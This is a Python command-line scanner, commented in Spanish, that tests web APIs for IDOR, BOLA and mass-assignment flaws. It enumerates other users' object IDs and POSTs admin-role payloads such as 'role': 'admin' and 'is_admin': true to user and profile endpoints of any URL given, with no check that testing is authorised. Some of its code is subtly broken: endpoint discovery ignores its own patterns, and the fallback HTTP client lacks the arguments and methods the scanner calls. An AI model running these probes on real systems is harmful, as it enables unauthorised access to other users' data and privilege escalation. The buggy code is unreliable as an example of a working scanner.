#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
IDOR SCANNER v2.0 - TANQUE EDITION
Detección de Insecure Direct Object References · BOLA · Mass Assignment
Con autenticación · Secuencias inteligentes · JSON parsing
"""

import asyncio
import json
import re
import sys
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional
import random

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None
        async def post(self, url, json=None): return None

class IDORScanner:
    def __init__(self, url: str, token: str = None, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.token = token
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        self.valid_ids = []
        
        # Patrones de IDs en URLs
        self.id_patterns = [
            (r'/users?/(\d+)', 'user'),
            (r'/profiles?/(\d+)', 'profile'),
            (r'/accounts?/(\d+)', 'account'),
            (r'/orders?/(\d+)', 'order'),
            (r'/products?/(\d+)', 'product'),
            (r'/items?/(\d+)', 'item'),
            (r'/posts?/(\d+)', 'post'),
            (r'/comments?/(\d+)', 'comment'),
            (r'/messages?/(\d+)', 'message'),
            (r'/files?/(\d+)', 'file'),
            (r'/documents?/(\d+)', 'document'),
            (r'/images?/(\d+)', 'image'),
            (r'/tickets?/(\d+)', 'ticket'),
            (r'/invoices?/(\d+)', 'invoice'),
            (r'/payments?/(\d+)', 'payment'),
        ]
        
        # Parámetros que contienen IDs
        self.id_params = [
            'id', 'user_id', 'profile_id', 'account_id', 'order_id',
            'product_id', 'item_id', 'post_id', 'comment_id', 'message_id',
            'file_id', 'document_id', 'image_id', 'ticket_id', 'invoice_id',
            'uid', 'pid', 'oid', 'cid', 'rid', 'sid', 'uuid',
            'userId', 'accountId', 'profileId', 'orderId', 'productId'
        ]
        
        # Secuencias inteligentes
        self.id_sequences = {
            'sequential': [1, 2, 3, 4, 5, 10, 100, 1000, 10000],
            'adjacent': [-1, +1, -2, +2],
            'high': [9999, 10000, 99999, 100000],
            'uuid': ['00000000-0000-0000-0000-000000000000',
                    '11111111-1111-1111-1111-111111111111'],
            'encoded': ['1', '01', '001', '0001', '1%00'],
        }
        
        # Payloads mass assignment
        self.mass_payloads = [
            {'role': 'admin', 'is_admin': True},
            {'role': 'administrator', 'admin': 1},
            {'role': 'superuser', 'superuser': True},
            {'permissions': ['*', 'admin', 'all']},
            {'access': 'full', 'level': 999},
            {'privilege': 'admin', 'group': 'administrators'},
            {'user_type': 'admin', 'account_type': 'premium'},
            {'is_admin': True, 'admin_access': True},
            {'role_id': 1, 'role': 'admin'},
            {'admin': True, 'administrator': True},
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP con token si existe"""
        self.client = HTTPClient(timeout=15, max_retries=2)
        
    def _get_auth_headers(self) -> Dict:
        """Añade headers de autenticación si hay token"""
        if self.token:
            return {'Authorization': f'Bearer {self.token}'}
        return {}
        
    async def extract_ids_from_response(self, content: str) -> List[str]:
        """Extrae IDs de respuestas JSON"""
        ids = []
        try:
            data = json.loads(content)
            
            def extract(obj):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if any(param in k.lower() for param in ['id', 'uuid', 'key']):
                            if isinstance(v, (int, str)):
                                ids.append(str(v))
                        elif isinstance(v, (dict, list)):
                            extract(v)
                elif isinstance(obj, list):
                    for item in obj:
                        extract(item)
                        
            extract(data)
        except:
            # Buscar con regex si no es JSON
            id_pattern = r'"id":\s*"?(\d+)"?'
            ids.extend(re.findall(id_pattern, content))
            
        return list(set(ids))
        
    async def discover_endpoints(self) -> List[Dict]:
        """Descubre endpoints con IDs"""
        endpoints = []
        
        # Probar URLs comunes
        base_paths = ['', 'api', 'api/v1', 'api/v2', 'rest', 'graphql']
        
        for base in base_paths:
            for pattern, type_name in self.id_patterns[:5]:
                # Probar con ID=1
                url = urljoin(self.url, f"{base}/users/1")
                try:
                    headers = self._get_auth_headers()
                    resp = await self.client.get(url, headers=headers)
                    
                    if resp and resp.status == 200:
                        text = await resp.text()
                        ids = await self.extract_ids_from_response(text)
                        
                        endpoints.append({
                            'url': url,
                            'type': type_name,
                            'ids': ids,
                            'pattern': pattern
                        })
                        
                        if ids:
                            self.valid_ids.extend(ids)
                            print(f"   [✓] Endpoint: {url} (IDs: {ids[:3]})")
                except:
                    pass
                    
        return endpoints
        
    async def test_idor(self, base_url: str, original_id: str, new_id: str, 
                       pattern: str, resource_type: str) -> Optional[Dict]:
        """Prueba IDOR cambiando IDs"""
        try:
            # Reemplazar ID
            test_url = base_url.replace(f'/{original_id}', f'/{new_id}')
            test_url = test_url.replace(f'={original_id}', f'={new_id}')
            
            headers = self._get_auth_headers()
            resp = await self.client.get(test_url, headers=headers)
            
            if not resp:
                return None
                
            text = await resp.text()
            
            # Verificar si accedimos a otro recurso
            if resp.status == 200:
                # Buscar indicadores de que es otro usuario
                if original_id not in text and new_id in text:
                    return {
                        'type': 'IDOR',
                        'resource': resource_type,
                        'url': test_url,
                        'original_id': original_id,
                        'new_id': new_id,
                        'status': resp.status,
                        'severity': 'CRITICO'
                    }
                    
                # Verificar si es JSON con datos diferentes
                try:
                    data1 = json.loads(await (await self.client.get(base_url, headers=headers)).text())
                    data2 = json.loads(text)
                    
                    if data1 != data2:
                        return {
                            'type': 'IDOR_JSON',
                            'resource': resource_type,
                            'url': test_url,
                            'original_id': original_id,
                            'new_id': new_id,
                            'severity': 'CRITICO'
                        }
                except:
                    pass
                    
        except Exception as e:
            pass
        return None
        
    async def test_mass_assignment(self, endpoint: str) -> List[Dict]:
        """Prueba mass assignment en endpoints POST/PUT"""
        findings = []
        
        for payload in self.mass_payloads:
            try:
                headers = self._get_auth_headers()
                headers['Content-Type'] = 'application/json'
                
                # Probar POST
                resp = await self.client.post(endpoint, json=payload, headers=headers)
                
                if resp and resp.status in [200, 201, 202]:
                    text = await resp.text()
                    
                    # Verificar si el payload fue aplicado
                    for key, value in payload.items():
                        if str(key) in text or str(value) in text:
                            findings.append({
                                'type': 'MASS_ASSIGNMENT',
                                'endpoint': endpoint,
                                'method': 'POST',
                                'payload': payload,
                                'severity': 'ALTO'
                            })
                            print(f"   [[WARN]] Mass assignment en {endpoint}")
                            break
                            
            except:
                pass
                
        return findings
        
    async def test_bola(self, collection_url: str) -> Optional[Dict]:
        """Prueba Broken Object Level Authorization en colecciones"""
        try:
            headers = self._get_auth_headers()
            resp = await self.client.get(collection_url, headers=headers)
            
            if resp and resp.status == 200:
                text = await resp.text()
                data = await self.extract_ids_from_response(text)
                
                if len(data) > 10:  # Muchos resultados = posible BOLA
                    return {
                        'type': 'BOLA',
                        'url': collection_url,
                        'items_count': len(data),
                        'severity': 'ALTO'
                    }
        except:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo IDOR completo"""
        print(f"\n[XSS] IDOR SCANNER v2.0 TANQUE - {self.url}")
        print("=" * 70)
        if self.token:
            print("[*] Usando autenticación Bearer token")
        print("-" * 70)
        
        await self.setup()
        
        try:
            # 1. Descubrir endpoints
            print("[*] Descubriendo endpoints con IDs...")
            endpoints = await self.discover_endpoints()
            
            if not endpoints:
                print("[!] No se encontraron endpoints con IDs")
                return []
                
            # 2. Probar IDOR en cada endpoint
            print(f"\n[*] Probando IDOR en {len(endpoints)} endpoints...")
            
            for ep in endpoints:
                if not ep.get('ids'):
                    continue
                    
                print(f"\n[*] Endpoint: {ep['url']}")
                original_id = ep['ids'][0] if ep['ids'] else '1'
                
                # Probar secuencias
                for seq_name, sequence in self.id_sequences.items():
                    for new_id in sequence[:5]:  # Limitar
                        new_id_str = str(new_id)
                        if new_id_str != original_id:
                            # Rate limiting
                            await asyncio.sleep(random.uniform(0.5, 1))
                            
                            result = await self.test_idor(
                                ep['url'], original_id, new_id_str,
                                ep['pattern'], ep['type']
                            )
                            
                            if result:
                                self.findings.append(result)
                                print(f"   [[CRITICO]] IDOR encontrado: {original_id} → {new_id_str}")
                                break
                                
                    # Si encontramos IDOR, seguir con otro endpoint
                    if any(f['type'] in ['IDOR', 'IDOR_JSON'] for f in self.findings[-5:]):
                        break
                        
            # 3. Probar mass assignment
            print("\n[*] Probando mass assignment...")
            mass_targets = ['/api/users', '/api/profile', '/user/update']
            for target in mass_targets:
                url = urljoin(self.url, target)
                findings = await self.test_mass_assignment(url)
                self.findings.extend(findings)
                
            # 4. Probar BOLA en colecciones
            print("\n[*] Probando BOLA en colecciones...")
            collections = ['/api/users', '/api/orders', '/api/products']
            for col in collections:
                url = urljoin(self.url, col)
                result = await self.test_bola(url)
                if result:
                    self.findings.append(result)
                    print(f"   [[WARN]] BOLA: {url} retorna {result['items_count']} items")
                    
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS IDOR/BOLA/MASS")
            print("="*70)
            
            if self.findings:
                idors = [f for f in self.findings if 'IDOR' in f['type']]
                bola = [f for f in self.findings if f['type'] == 'BOLA']
                mass = [f for f in self.findings if f['type'] == 'MASS_ASSIGNMENT']
                
                if idors:
                    print(f"\n[CRITICO] IDOR: {len(idors)}")
                    for f in idors[:5]:
                        print(f"   • {f['url']} ({f['original_id']} → {f['new_id']})")
                        
                if bola:
                    print(f"\n[WARN]  BOLA: {len(bola)}")
                    
                if mass:
                    print(f"\n[INFO] MASS: {len(mass)}")
                    
                print(f"\n[OK] TOTAL: {len(self.findings)}")
            else:
                print("\n[OK] No se encontraron vulnerabilidades")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 idor_scanner.py <URL> [token]")
        print("Ejemplo: python3 idor_scanner.py https://ejemplo.com/api")
        print("         python3 idor_scanner.py https://ejemplo.com/api token123")
        sys.exit(1)
        
    url = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    scanner = IDORScanner(url, token)
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
